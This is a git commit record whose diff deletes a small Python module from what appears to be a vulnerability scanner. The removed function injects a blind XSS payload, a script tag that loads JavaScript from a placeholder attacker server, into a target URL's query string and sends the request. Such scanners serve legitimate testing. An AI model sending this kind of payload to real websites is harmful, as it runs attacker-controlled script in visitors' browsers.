69d96e9d8a56acd462b74cbdb1fbde8608f0c5d8
AboAliwa0 <ahmeai671@gmail.com>
2026-04-10 22:37:06 +0200

    1

--- vulnerabilities/blind_xss.py
+++
@@ -1,9 +0,0 @@
-def scan(url):
-    from utils.requester import send_request
-
-    payload = '<script src="http://your-server.com/xss.js"></script>'
-    test_url = url + "?input=" + payload
-
-    send_request(test_url)
-
-    return "[*] Blind XSS Payload Sent"
